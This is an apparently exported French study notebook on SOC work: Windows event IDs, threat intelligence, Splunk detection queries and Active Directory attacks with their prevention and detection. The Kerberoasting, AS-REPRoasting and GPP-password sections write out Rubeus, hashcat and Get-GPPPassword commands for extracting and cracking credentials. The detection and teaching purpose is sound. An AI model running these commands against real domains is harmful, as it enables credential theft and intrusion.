id="CcTo"><strong>4771</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Kerberos</td><td class="" id="uR\`">√âchec d‚Äôauthentification Kerberos.</td></tr><tr id="1e825200-7eb4-8034-8e56-c97aa48f7f32"><td class="" id="CcTo"><strong>4776</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Credential Validation</td><td class="" id="uR\`">Validation de mot de passe par le contr√¥leur de domaine.</td></tr><tr id="1e825200-7eb4-80cb-b141-d334d64902c4"><td class="" id="CcTo"><strong>5001</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Antivirus Settings</td><td class="" id="uR\`">Modification de la configuration de protection en temps r√©el.</td></tr><tr id="1e825200-7eb4-80da-852c-f9c3a58f0efe"><td class="" id="CcTo"><strong>5140</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Network Share</td><td class="" id="uR\`">Acc√®s √† un partage r√©seau.</td></tr><tr id="1e825200-7eb4-801a-a971-e8d6b5abb89e"><td class="" id="CcTo"><strong>5142</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Network Share</td><td class="" id="uR\`">Cr√©ation d‚Äôun nouveau partage r√©seau.</td></tr><tr id="1e825200-7eb4-8004-b5c1-d1170fe64bcb"><td class="" id="CcTo"><strong>5145</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Network Share</td><td class="" id="uR\`">Tentative d‚Äôacc√®s √† un fichier/dossier partag√©.</td></tr><tr id="1e825200-7eb4-80ee-8a93-dcdcf41ad8f9"><td class="" id="CcTo"><strong>5157</strong></td><td class="" id="QMy\">Security</td><td class="" id="TF\&gt;">Network Filtering</td><td class="" id="uR\`">Connexion r√©seau bloqu√©e par le pare-feu.</td></tr></tbody></table><p class="" id="1e825200-7eb4-8070-a68a-e42978037873">
</p></div></figure></div></details></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Introduction to Threat Hunting &amp; Hunting With Elastic</strong></summary><div class="indented"><pre class="code code-wrap" id="1e825200-7eb4-8041-a974-d7a36de2c0e6"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Qu‚Äôest-ce que le Cyber Threat Intelligence (CTI) ?

Le CTI (Cyber Threat Intelligence) d√©signe l‚Äôensemble des informations analys√©es sur les menaces cyber permettant d‚Äôanticiper, d√©tecter, comprendre et r√©pondre aux attaques. Son objectif est de passer d‚Äôune posture d√©fensive r√©active √† une posture proactive.

Les 4 piliers du CTI efficace :
Pertinence : L‚Äôinformation doit concerner l‚Äôenvironnement ou les partenaires de l‚Äôentreprise.
Temporalit√© : L‚Äôinformation doit √™tre transmise rapidement ‚Äì elle perd de la valeur avec le temps.
Actionnabilit√© : Elle doit pouvoir √™tre utilis√©e imm√©diatement pour renforcer la d√©fense.
Exactitude : L'information doit √™tre v√©rifi√©e. Sinon, on indique un niveau de confiance.

üÜö CTI vs. Threat Hunting :

| CTI (Pr√©dictif)                                     | Threat Hunting (Proactif &amp; R√©actif)               |
| ------------------------------------------------------- | ----------------------------------------------------- |
| Anticiper l‚Äôadversaire (o√π, quand, comment, pourquoi ?) | Rechercher la pr√©sence de l‚Äôadversaire dans le r√©seau |
| Sert √† pr√©dire les attaques                             | Sert √† d√©tecter des menaces existantes ou pass√©es     |
| Partage d'infos avec les hunters                        | S'appuie sur le CTI pour orienter les recherches      |

Utilit√© du CTI :
Compr√©hension des menaces ciblant l‚Äôorganisation.
Aide √† la prise de d√©cision strat√©gique (r√©duction du risque).
Mise en place de plans d‚Äôaction en cas de crise.

Les 3 niveaux de Cyber Threat Intelligence :
Strat√©gique
Pour les dirigeants (C-suite, VPs)
R√©pond au "Qui ?" et "Pourquoi ?"
Ex : rapports sur APT28, motivations, cibles, historique
Op√©rationnel
Pour les managers interm√©diaires
R√©pond au "Comment ?" et "O√π ?"
Ex : tactiques d√©taill√©es d‚Äôun groupe comme REvil
Tactique
Pour les analystes et d√©fenseurs r√©seau
Fournit des IOCs : IPs, domaines, hashes, etc.
Utilis√© dans les outils de d√©tection (SIEM, EDR, IDS/IPS)

Lire un rapport de CTI tactique ‚Äì √âtapes cl√©s :
Comprendre le contexte du rapport (secteur cibl√©, objectif).
Identifier et classifier les IOCs (r√©seau, h√¥te, email, etc.).
Comprendre le cycle de vie de l‚Äôattaque (souvent mapp√© au MITRE ATT\&amp;CK).
V√©rifier les IOCs (via VirusTotal, OTX, etc.) pour √©viter les faux positifs.
Impl√©menter les IOCs dans l‚Äôinfrastructure (SIEM, firewall, EDR‚Ä¶).
Chasser les menaces activement (Threat Hunting bas√© sur les IOCs et TTPs).
Surveiller et apprendre en continu, tout en partageant de nouvelles infos.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Understanding Log Sources &amp; Investigating with Splunk</strong></summary><div class="indented"><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Toutes les commandes</summary><div class="indented"><pre class="code code-wrap" id="1e825200-7eb4-80ff-a6ce-ca4dd37bc1ce"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Commandes de base Splunk
Recherche simple

search index="main" "UNKNOWN"
Op√©rateurs bool√©ens et de comparaison

index="main" EventCode!=1

Manipulation de champs
fields ‚Äì Inclure/exclure des champs

fields - User
rename ‚Äì Renommer des champs

rename Image as Process
eval ‚Äì Cr√©er ou modifier un champ

eval ProcessPath=lower(Image)
rex ‚Äì Extraire via regex

rex maxmatch=0 "[^%](?&lt;guid&gt;{.})"

Affichage et tri
table ‚Äì Afficher des champs sp√©cifiques

table time, host, Image
dedup ‚Äì Supprimer les doublons

dedup Image
sort ‚Äì Trier les r√©sultats

sort - time

Statistiques et visualisation
stats ‚Äì Agr√©gations statistiques

stats count by time, Image
chart ‚Äì Graphiques/agr√©gats visuels

chart count by time, Image

Lookups et enrichissement
lookup ‚Äì Croiser avec une source externe

lookup malwarelookup.csv filename OUTPUTNEW ismalware
inputlookup ‚Äì Lire un fichier de lookup

| inputlookup malwarelookup.csv

‚è± Filtrage temporel

index="main" earliest=-7d EventCode!=1

Recherche avanc√©e
transaction ‚Äì Grouper des √©v√©nements li√©s

transaction Image startswith=eval(EventCode=1) endswith=eval(EventCode=3) maxspan=1m
Subsearch ‚Äì Requ√™te imbriqu√©e

index="main" EventCode=1 NOT [ search ... ]

D√©couverte de donn√©es
Lister les index

| eventcount summarize=false index= | table index
Lister les sourcetypes

| metadata type=sourcetypes
Afficher les logs bruts
sourcetype="WinEventLog:Security" | table raw

Data Models &amp; Pivot
Data Models : Mod√®le structur√© de donn√©es Splunk (base des CIM).
Pivot : Interface graphique pour requ√™tes sans √©crire du SPL.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Intrusion Detection With Splunk (Real-world Scenario)</strong></summary><div class="indented"><pre class="code code-wrap" id="1e825200-7eb4-8003-997c-c81a221dd91d"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Introduction
Passage de l‚Äôanalyse de logs individuels √† la surveillance r√©seau compl√®te.
Utilisation des Windows Event Logs multi-machines pour d√©tecter les activit√©s malveillantes.
Objectif : filtrer les faux positifs et cr√©er des requ√™tes pr√©cises pour g√©n√©rer des alertes fiables.

Sources de Donn√©es
Donn√©es √† ing√©rer :
BOTS (Boss of the SOC) ‚Äì Fournies par Splunk.
logs.to ‚Äì G√©n√©re des logs JSON factices.
    
     √Ä configurer avec Indexed Extractions = JSON.
    
Exemple de requ√™te pour tout afficher :

index="main" earliest=0
Plus de 500 000 √©v√©nements simul√©s, avec divers types d‚Äôattaques et infections.

Techniques de Recherche Efficaces
Comparaison de recherches :
Recherche g√©n√©rale :

index="main" uniwaldo.local
Recherche par wildcard (moins performante) :

index="main" uniwaldo.local
Recherche cibl√©e par champ (optimis√©e) :

index="main" ComputerName="uniwaldo.local"

√âv√©nements Sysmon √† surveiller

| Event ID | Signification |
| --- | --- |
| 1 | Cr√©ation de processus (parent/enfant anormaux) |
| 3 | Connexions r√©seau (bruyant mais utile) |
| 5 | Fin de processus (kill suspects) |
| 6 | Chargement de driver (BYOD, rootkits) |
| 10 | Acc√®s m√©moire (dump, injection, lsass) |
| 25 | D√©tournement de processus (tampering) |
Exemple - Parent/Child suspects :

index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | stats count by ParentImage, Image

D√©tection Avanc√©e &amp; IP Suspectes
Exemple de recherche IP :

index="main" 10.0.0.229 | stats count by sourcetype
Permet d‚Äôidentifier des connexions sortantes potentiellement malveillantes.
Dumping de credentials (lsass) :

index="main" EventCode=10 lsass | stats count by SourceImage

Cr√©ation d‚ÄôAlertes Pr√©cises
√âtapes :
D√©tection des appels UNKNOWN :

index="main" CallTrace="UNKNOWN" | stats count by EventCode
Filtrage des faux positifs (JIT, .NET, wow64, etc.) :

index="main" CallTrace="UNKNOWN" SourceImage!="Microsoft.NET" CallTrace!=ni.dll" CallTrace!=clr.dll" CallTrace!=wow64" | where SourceImage!=TargetImage | stats count by SourceImage
Exclusion d‚ÄôExplorer.exe et regroupement complet :

index="main" CallTrace="UNKNOWN" SourceImage!="Microsoft.NET" CallTrace!=ni.dll" CallTrace!=clr.dll" CallTrace!=wow64*" SourceImage!="C:\Windows\Explorer.EXE" | where SourceImage!=TargetImage | stats count by SourceImage, TargetImage, CallTrac
Produit une alerte fiable sur les anomalies r√©elles.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Attacker Behavior With Splunk Based On TTPs</strong></summary><div class="indented"><pre class="code code-wrap" id="1e825200-7eb4-8050-b4dd-cb52660ba09b"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">D√©tection des Tactiques, Techniques et Proc√©dures (TTPs) dans Splunk

En cybers√©curit√©, identifier les TTPs des attaquants est essentiel pour d√©tecter efficacement les menaces. Cela implique de rep√©rer des comportements connus malveillants ou des anomalies inhabituelles.
Deux approches compl√©mentaires :
TTPs connus : utiliser des comportements d'attaque document√©s pour cr√©er des r√®gles de d√©tection pr√©cises.
D√©tection d'anomalies : rep√©rer des sch√©mas inhabituels via des analyses statistiques, sans connaissance pr√©alable de l'attaque.

Le bon √©quilibre entre ces deux m√©thodes permet une couverture large et efficace. Des ajustements r√©guliers des requ√™tes et des seuils sont n√©cessaires pour affiner les r√©sultats et limiter les faux positifs.

Exemples de Recherches SPL Bas√©es sur des TTPs Connus
Reconnaissance via binaires Windows natifs

Les outils comme ipconfig.exe, net.exe, ou whoami.exe sont souvent utilis√©s par les attaquants pour l‚Äôexploration initiale.

index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 Image=\ipconfig.exe OR Image=\net.exe OR Image=\whoami.exe OR Image=\netstat.exe OR Image=\nbtstat.exe OR Image=\hostname.exe OR Image=\tasklist.exe
| stats count by Image, CommandLine
| sort - count

T√©l√©chargement malveillant depuis des domaines r√©put√©s (ex: GitHub)

index="main" sourcetype="WinEventLog:Sysmon" EventCode=22 QueryName="github"
| stats count by Image, QueryName

Utilisation suspecte de PsExec

Cas 1 ‚Äì √âcriture dans la base de registre :

index="main" sourcetype="WinEventLog:Sysmon" EventCode=13 Image="C:\Windows\system32\services.exe" TargetObject="HKLM\System\CurrentControlSet\Services\\ImagePath"
| rex field=Details "(?&lt;regfilename&gt;[^\\]+)$"
| eval filename = if(isnull(filename),regfilename,lower(filename))
| stats values(Image) AS Image, values(Details) AS RegistryDetails, values(time) AS EventTimes, count by file_name, ComputerName

Cas 2 ‚Äì Fichiers suspects (Event ID 11)

index="main" sourcetype="WinEventLog:Sysmon" EventCode=11 Image=System
| stats count by TargetFilename

Cas 3 ‚Äì Nom de pipe inter-process suspect (Event ID 18)

index="main" sourcetype="WinEventLog:Sysmon" EventCode=18 Image=System
| stats count by PipeName

Utilisation d‚Äôarchives pour l‚Äôexfiltration ou le transfert

index="main" EventCode=11 (TargetFilename=".zip" OR TargetFilename=".rar" OR TargetFilename=".7z")
| stats count by ComputerName, User, TargetFilename
| sort - count

T√©l√©chargements via PowerShell ou Edge


index="main" sourcetype="WinEventLog:Sysmon" EventCode=11 Image="powershell.exe"
| stats count by Image, TargetFilename
| sort + count

Microsoft Edge (Zone.Identifier)

index="main" sourcetype="WinEventLog:Sysmon" EventCode=11 Image="msedge.exe" TargetFilename="Zone.Identifier"
| stats count by TargetFilename
| sort + count

Ex√©cution depuis des emplacements inhabituels

index="main" EventCode=1
| regex Image="C:\\Users\\.\\Downloads\\."
| stats count by Image

Ex√©cutables cr√©√©s hors du r√©pertoire Windows

index="main" EventCode=11 (TargetFilename=".exe" OR TargetFilename=".dll") TargetFilename!="\windows\"
| stats count by User, TargetFilename
| sort + count

D√©tection de binaires mal orthographi√©s (ex: psexe au lieu de PsExec)

index="main" sourcetype="WinEventLog:Sysmon" EventCode=1
(CommandLine="psexe.exe" NOT (CommandLine="PSEXESVC.exe" OR CommandLine="PsExec64.exe"))
OR (ParentCommandLine="psexe.exe" NOT (ParentCommandLine="PSEXESVC.exe" OR ParentCommandLine="PsExec64.exe"))
OR (ParentImage="psexe.exe" NOT (ParentImage="PSEXESVC.exe" OR ParentImage="PsExec64.exe"))
OR (Image="psexe.exe" NOT (Image="PSEXESVC.exe" OR Image="*PsExec64.exe"))
| table Image, CommandLine, ParentImage, ParentCommandLine

Ports non standards (commandes ou tunnels suspects)

index="main" EventCode=3
NOT (DestinationPort=80 OR DestinationPort=443 OR DestinationPort=22 OR DestinationPort=21)
| stats count by SourceIp, DestinationIp, DestinationPort
| sort - count</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Attacker Behavior With Splunk Based On Analytics</strong></summary><div class="indented"><pre class="code code-wrap" id="1e825200-7eb4-80ac-bd9a-ca9b8aecbedb"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">D√©tection d'anomalies dans Splunk : Identifier les comportements inhabituels

Dans le domaine de la cybers√©curit√©, la d√©tection bas√©e sur les anomalies est essentielle pour identifier des comportements suspects qui √©chappent aux m√©thodes classiques fond√©es sur les TTP (Tactics, Techniques, and Procedures). En profilant l‚Äôactivit√© normale d‚Äôun syst√®me, Splunk permet, gr√¢ce √† des commandes statistiques comme streamstats, de rep√©rer les √©carts significatifs qui pourraient indiquer une compromission.

Exemple 1 : D√©tection de connexions r√©seau anormales avec streamstats

Cette requ√™te surveille la fr√©quence des connexions r√©seau par processus. Elle signale ceux qui d√©passent un seuil statistique bas√© sur leur comportement historique.

index="main" sourcetype="WinEventLog:Sysmon" EventCode=3
| bin time span=1h
| stats count as NetworkConnections by time, Image
| streamstats timewindow=24h avg(NetworkConnections) as avg stdev(NetworkConnections) as stdev by Image
| eval isOutlier=if(NetworkConnections &gt; (avg + 0.5  stdev), 1, 0)
| search isOutlier=1

Explication :
streamstats calcule la moyenne et l‚Äô√©cart-type glissants sur 24h.
Un processus est signal√© s‚Äôil d√©passe la moyenne de plus de 0,5 √©cart-type.

Exemple 2 : D√©tection de commandes anormalement longues

Des lignes de commande tr√®s longues peuvent indiquer des tentatives d‚Äô√©vasion ou d‚Äôobfuscation.

index="main" sourcetype="WinEventLog:Sysmon" Image=cmd.exe
| eval len=len(CommandLine)
| table User, len, CommandLine
| sort - len

Pour affiner les r√©sultats, on peut exclure les processus parent b√©nins :

index="main" sourcetype="WinEventLog:Sysmon" Image=cmd.exe 
ParentImage!="msiexec.exe" ParentImage!="explorer.exe"
| eval len=len(CommandLine)
| table User, len, CommandLine
| sort - len

Exemple 3 : Activit√© inhabituelle de cmd.exe par utilisateur

Ce cas d√©tecte une augmentation soudaine de l‚Äôutilisation de cmd.exe pour un utilisateur donn√©.

index="main" EventCode=1 (CommandLine="cmd.exe")
| bucket time span=1h
| stats count as cmdCount by time User CommandLine
| eventstats avg(cmdCount) as avg stdev(cmdCount) as stdev
| eval isOutlier=if(cmdCount &gt; avg + 1.5  stdev, 1, 0)
| search isOutlier=1

Exemple 4 : Chargement rapide de nombreuses DLLs

Une activit√© malveillante peut charger plusieurs DLLs en peu de temps. Cette requ√™te identifie les processus impliqu√©s :

index="main" EventCode=7 
NOT (Image="C:\Windows\System32") NOT (Image="C:\Program Files")
| bucket time span=1h
| stats dc(ImageLoaded) as uniquedllsloaded by time, Image
| where uniquedllsloaded &gt; 3
| stats count by Image, uniquedllsloaded
| sort - uniquedlls_loaded

Exemple 5 : Ex√©cutions multiples d‚Äôun m√™me processus sur un h√¥te

Des ex√©cutions r√©p√©t√©es peuvent trahir des activit√©s suspectes :

index="main" sourcetype="WinEventLog:Sysmon" EventCode=1
| transaction ComputerName, Image
| where mvcount(ProcessGuid) &gt; 1
| stats count by Image, ParentImage

Pour cibler des cas particuliers, comme rundll32.exe ex√©cut√© par svchost.exe :

index="main" sourcetype="WinEventLog:Sysmon" EventCode=1
| transaction ComputerName, Image
| where mvcount(ProcessGuid) &gt; 1
| search Image="C:\Windows\System32\rundll32.exe" ParentImage="C:\Windows\System32\svchost.exe"
| table CommandLine, ParentCommandLine</code></pre></div></details><p class="" id="1e825200-7eb4-8024-b97c-d379185fbe61">
</p></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong> Windows Attacks &amp; Defense </strong></summary><div class="indented"><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Kerberoasting</summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-8067-bdb1-c533f09facff"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Kerberoasting dans Active Directory ‚Äì Explication, Attaque, Pr√©vention et D√©tection
Qu'est-ce qu'un SPN ?

Un Service Principal Name (SPN) est un identifiant unique utilis√© par Kerberos pour authentifier un service sans avoir besoin de conna√Ætre le nom de compte du service. Lorsqu‚Äôun ticket TGS (Ticket Granting Service) est demand√©, il est chiffr√© avec le hash NTLM du compte de service.

Kerberoasting : Principe de l‚Äôattaque

Kerberoasting est une technique post-exploitation. Elle consiste √† :
R√©cup√©rer les tickets TGS de services (associ√©s aux SPNs).
Les cracker hors ligne afin de retrouver le mot de passe du compte de service.

L‚Äôattaque est d‚Äôautant plus efficace si :
Le mot de passe du compte est faible.
Le ticket utilise un algorithme de chiffrement vuln√©rable.
Algorithmes de chiffrement utilis√©s :
AES : tr√®s s√©curis√©, difficile √† cracker.
RC4 : fr√©quemment vuln√©rable.
DES : obsol√®te, rarement utilis√© aujourd‚Äôhui.

Malgr√© les recommandations de s√©curit√©, RC4 et DES sont encore pr√©sents dans certains environnements.

Chemin d'attaque
Extraction des tickets TGS

Avec des outils comme Rubeus, un attaquant peut extraire les tickets Kerberos li√©s aux comptes SPN :

PS C:\Users\bob\Downloads&gt; .\Rubeus.exe kerberoast /outfile:spn.txt
Les tickets sont enregistr√©s dans spn.txt.
Crackage des tickets

Les hashes extraits sont ensuite transf√©r√©s sur un outil comme Hashcat (Linux/Kali) pour tentative de bruteforce :

hashcat -m 13100 -a 0 spn.txt passwords.txt --outfile="cracked.txt"
-m 13100 : mode Hashcat pour Kerberoasting.
passwords.txt : dictionnaire de mots de passe.
R√©sultat : les mots de passe de comptes de service sont r√©v√©l√©s en clair.

cat cracked.txt
Pr√©vention

Pour contrer cette attaque :
Mots de passe robustes : longs et complexes (id√©alement &gt; 100 caract√®res).
Limiter les comptes SPN : supprimer les SPN inutilis√©s.
Utiliser les GMSA (Group Managed Service Accounts) : mots de passe g√©r√©s et renouvel√©s automatiquement.

D√©tection

Chaque demande de TGS g√©n√®re un √©v√©nement Windows ID 4769. Bien qu‚Äôil soit difficile de tout surveiller, certains comportements sont suspects :
Tickets RC4 : si l‚Äôenvironnement est cens√© utiliser uniquement AES, alerter sur tout ticket RC4.
Volume anormal de requ√™tes TGS : surtout depuis un seul poste ou utilisateur.
Comptes honeypot : cr√©er un faux compte avec un SPN, inactif mais attirant. Toute requ√™te √† ce compte est suspecte.

Cr√©ation d‚Äôun compte honeypot

Crit√®res pour un compte leurre efficace :
Ancien compte : inactif depuis &gt; 2 ans.
Mot de passe incassable.
SPN r√©aliste : li√© √† un service comme IIS ou SQL.

Exemple :

Nom du compte : svc-iam
SPN attribu√© : HTTP/svc-iam.domain.local
Remarque importante

Multiplier les honeypots peut rendre leur pr√©sence d√©tectable. Il est donc crucial d‚Äôadapter ces techniques √† votre environnement, en combinant s√©curit√© et discr√©tion.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">AS-REProasting</summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-8056-9b36-d47d94d9b1f2"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">AS-REPRoasting dans Active Directory ‚Äì Description, Attaque, Pr√©vention et D√©tection
Qu'est-ce que l'AS-REPRoasting ?

L'attaque AS-REPRoasting est similaire au Kerberoasting. Elle cible les comptes utilisateurs configur√©s sans pr√©-authentification Kerberos (option "Do not require Kerberos preauthentication"). Cette configuration permet aux attaquants de r√©cup√©rer des hashs Kerberos crackables sans interaction avec le mot de passe du compte.

Le succ√®s de l‚Äôattaque d√©pend principalement de la robustesse du mot de passe du compte cibl√©.

√âtapes de l‚Äôattaque
Extraction des hashs AS-REP

√Ä l‚Äôaide d‚Äôoutils comme Rubeus, les attaquants extraient les hashs des comptes vuln√©rables :

PS C:\Users\bob\Downloads&gt; .\Rubeus.exe asreproast /outfile:asrep.txt
Les hashs sont enregistr√©s dans le fichier asrep.txt.
Pr√©paration du hash pour cracking

Avant le bruteforce, le hash doit √™tre format√© pour Hashcat. Il faut s‚Äôassurer que le hash commence par :

$krb5asrep$23$...
Exemple :

$krb5asrep$23$anni@eagle.local:1b912b858c4551c0013dbe81ff0f01d7$c6480335...
Crackage avec Hashcat

Utilisation de Hashcat en mode 18200, sp√©cialement con√ßu pour les hashs AS-REP :

sudo hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile asrepcrack.txt --force
Affichage des r√©sultats

Une fois le mot de passe trouv√©, l‚Äôouvrir en clair :

cat asrepcrack.txt
Pr√©vention

La s√©curit√© repose principalement sur la configuration des comptes et la politique de mot de passe.
R√©vision r√©guli√®re : D√©sactivez l‚Äôoption "no preauthentication" sauf si elle est strictement n√©cessaire. Faites des audits trimestriels pour d√©tecter toute mauvaise configuration.
Politique de mot de passe renforc√©e : Imposer une longueur minimale de 20 caract√®res pour les comptes sans pr√©-authentification.

D√©tection

Lorsqu‚Äôun TGT est demand√©, l‚Äô√©v√©nement Windows ID 4768 est g√©n√©r√©. Bien que courant, il est possible de d√©tecter des comportements suspects en :
Corr√©lant les IP/VLAN : Identifier les sources inhabituelles de requ√™tes.
Analyse comportementale : Surveiller les requ√™tes fr√©quentes sur un m√™me compte ou depuis des adresses inconnues.

D√©ploiement d‚Äôun compte honeypot

Un compte honeypot bien configur√© peut attirer et identifier les attaques AS-REPRoasting. Il doit r√©pondre √† certains crit√®res :
Ancien compte : Inactif depuis longtemps, avec un mot de passe jamais chang√©.
Connexion r√©cente : Doit appara√Ætre actif pour para√Ætre l√©gitime.
Privil√®ges assign√©s : Assez de droits pour attirer l‚Äôattention des attaquants.
Pr√©-authentification d√©sactiv√©e : Condition n√©cessaire pour l‚Äôattaque.

Exemple :

Nom du compte : svc-iam  
Configuration : privil√®ges √©lev√©s, pr√©-authentification Kerberos d√©sactiv√©e
Conseil de prudence

√âvitez de surutiliser les honeypots, au risque de cr√©er des sch√©mas d√©tectables par les attaquants. S√©lectionnez les m√©thodes de d√©tection les plus adapt√©es √† votre environnement pour √©quilibrer efficacit√© et discr√©tion.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">GPP Passwords</summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-80d5-8056-e82064ae1632"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Exploitation des mots de passe GPP dans SYSVOL ‚Äì Description, Attaque, Pr√©vention et D√©tection
Qu‚Äôest-ce que SYSVOL ?

SYSVOL est un partage r√©seau pr√©sent sur tous les Domain Controllers (DC), contenant :
Scripts de connexion,
Donn√©es de strat√©gies de groupe (GPO),
Et d'autres fichiers essentiels √† l‚Äôenvironnement Active Directory.

Les strat√©gies de groupe sont stock√©es ici :

\\&lt;DOMAINE&gt;\SYSVOL\&lt;DOMAINE&gt;\Policies\
Avec Windows Server 2008, les Group Policy Preferences (GPP) ont introduit la possibilit√© d‚Äôenregistrer des identifiants dans certains fichiers XML. Ces identifiants incluent un mot de passe chiffr√© avec une cl√© qui a √©t√© rendue publique par Microsoft, ce qui rend possible leur d√©chiffrement par tout utilisateur authentifi√© du domaine.

Sc√©nario d‚Äôattaque
Extraction et d√©chiffrement des mots de passe GPP

Gr√¢ce √† des outils comme PowerSploit, un attaquant peut rechercher les fichiers XML contenant le champ cpassword, et les d√©crypter √† l‚Äôaide de la cl√© publi√©e :

Import-Module .\Get-GPPPassword.ps1
Get-GPPPassword
Exemple de r√©sultat :

UserName  : svc-iis  
Password  : abcd@123  
File      : \\EAGLE.LOCAL\SYSVOL\eagle.local\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml  
Cpassword : qRI/NPQtItGsMjwMkhF7ZDvK6n9KlOhBZ/XShO2IZ80  
Le mot de passe est visible en clair apr√®s d√©chiffrement.

Pr√©vention
Mise √† jour critique : Microsoft a publi√© KB2962486 (2014) pour d√©sactiver la possibilit√© d‚Äôenregistrer de nouveaux mots de passe dans les GPP.
   Attention : cette mise √† jour ne supprime pas les anciens mots de passe d√©j√† pr√©sents.
Audit r√©gulier : Dans les environnements mis en place avant 2014, il est imp√©ratif de v√©rifier que plus aucun mot de passe n‚Äôest expos√© dans SYSVOL.

D√©tection
Surveillance des acc√®s aux fichiers XML contenant cpassword
Activez l‚Äôaudit sur les dossiers GPP contenant des fichiers sensibles.
Chaque acc√®s g√©n√®re un √©v√©nement 4663, utile pour identifier des lectures non l√©gitimes.
Tentatives de connexion avec les identifiants expos√©s
Surveillez les connexions avec les comptes expos√©s, notamment :
4624 ‚Äì Connexion r√©ussie
4625 ‚Äì √âchec de connexion
4768 ‚Äì Requ√™te de ticket Kerberos (TGT)
Une connexion r√©ussie depuis une machine inattendue est un indicateur fort d‚Äôabus.

D√©ploiement d‚Äôun compte honeypot

La mise en place d‚Äôun faux compte de service dans un fichier GPP peut pi√©ger les attaquants.
Crit√®res pour un compte honeypot efficace :
Mot de passe invalide : L‚Äôidentifiant affich√© est incorrect ou d√©suet.
Anciennet√© apparente : La date de dernier changement de mot de passe pr√©c√®de la derni√®re modification du fichier XML.
Simulation d‚Äôactivit√© : Une t√¢che planifi√©e bidon simule des connexions r√©guli√®res.
Toute tentative de connexion r√©elle √† ce compte (en dehors du script simul√©) d√©clenche une alerte.
√âv√©nements √† surveiller :
4625 ‚Äì √âchec de connexion
4771 ‚Äì √âchec d‚Äôauthentification Kerberos
4776 ‚Äì √âchec d‚Äôauthentification NTLM

Remarque strat√©gique

L‚Äôusage excessif de leurres trop √©vidents peut trahir vos m√©canismes de d√©tection. Adaptez vos honeypots avec r√©alisme et discr√©tion pour maximiser leur efficacit√© sans √©veiller les soup√ßons.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">GPO Permissions/GPO Files</summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-80f2-9d12-d00ba0dc9a8a"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Abus des GPO dans Active Directory ‚Äì Description, Attaque, Pr√©vention et D√©tection
Qu‚Äôest-ce qu‚Äôun GPO ?

Un Group Policy Object (GPO) est un ensemble de configurations appliqu√©es √† des objets Active Directory (utilisateurs, ordinateurs) via des Unit√©s d‚ÄôOrganisation (OU). Chaque GPO a un nom unique et peut √™tre filtr√© par :
Groupes de s√©curit√© (ex. : Domain Users),
Filtres WMI,
OU sp√©cifiques.
Par d√©faut, seuls les Domain Admins et r√¥les privil√©gi√©s peuvent modifier un GPO. Mais des d√©l√©gations sp√©cifiques peuvent √©tendre ces droits √† des utilisateurs moins privil√©gi√©s.

Vecteurs d‚Äôattaque GPO

Un attaquant ayant acc√®s √† un compte compromis avec droits d‚Äô√©dition sur un GPO peut :
Ajouter des scripts de d√©marrage, t√¢ches planifi√©es ou logiciels malveillants.
Cibler les objets dans l‚ÄôOU li√©e au GPO, compromettant ainsi plusieurs machines.

Un autre vecteur courant est l‚Äôexploitation de partages r√©seau mal configur√©s contenant des fichiers utilis√©s par des GPOs (ex. : scripts ou ex√©cutables). Si les droits NTFS permettent l'√©criture, l‚Äôattaquant peut remplacer un fichier l√©gitime par un fichier malveillant, m√™me si le GPO est intact.

Exploitation des permissions GPO
Attaque directe :
Modifier un GPO vuln√©rable (permissions trop larges).
Ajouter un script ou un ex√©cutable malveillant.
Attaque indirecte :
Identifier un GPO utilisant un fichier sur un partage modifiable.
Remplacer ce fichier par une version malveillante.

Pr√©vention

 Restreindre strictement les permissions GPO :
Limiter les droits de modification √† une liste de comptes de confiance.

 Revue r√©guli√®re des GPOs :
Mettre en place une v√©rification horaire automatis√©e des permissions GPO.
D√©tecter tout √©cart par rapport aux configurations pr√©vues.

 S√©curiser les partages r√©seau :
Ne jamais utiliser de fichiers GPO h√©berg√©s sur des partages accessibles en √©criture √† plusieurs utilisateurs.

D√©tection
Modification d‚Äôun GPO

Activez l‚Äôaudit des modifications d‚Äôannuaire pour capturer l‚Äô√©v√©nement suivant :
Event ID 5136 : signale une modification d‚Äôobjet, y compris de GPO.
Toute modification faite par un utilisateur non autoris√© doit g√©n√©rer une alerte imm√©diate.

Honeypot GPO

